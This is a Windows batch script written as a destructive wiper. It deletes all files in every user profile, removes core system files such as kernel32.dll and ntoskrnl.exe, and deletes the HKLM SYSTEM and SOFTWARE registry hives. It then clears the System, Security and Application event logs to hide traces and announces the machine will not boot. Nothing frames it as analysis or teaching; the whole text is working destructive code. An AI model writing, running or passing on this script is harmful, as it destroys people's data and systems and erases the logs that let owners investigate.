@echo off
:: Delete user data from all profiles
echo Deleting user data...
for /d %%i in (C:\Users\*) do (
    if not "%%i"=="C:\Users\Public" if not "%%i"=="C:\Users\Default" (
        del /s /q /f "%%i\*.*"
        rd /s /q "%%i"
    )
)

:: Corrupt critical system files to render OS inoperable
echo Corrupting system files...
del /f /q C:\Windows\System32\kernel32.dll
del /f /q C:\Windows\System32\ntoskrnl.exe
del /f /q C:\Windows\System32\hal.dll

:: Corrupt registry hives
echo Corrupting registry...
reg delete HKLM\SYSTEM /f
reg delete HKLM\SOFTWARE /f

:: Clear event logs to minimize traces
echo Clearing event logs...
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

:: Exit
echo Done. System will be inoperable on next boot.
exit
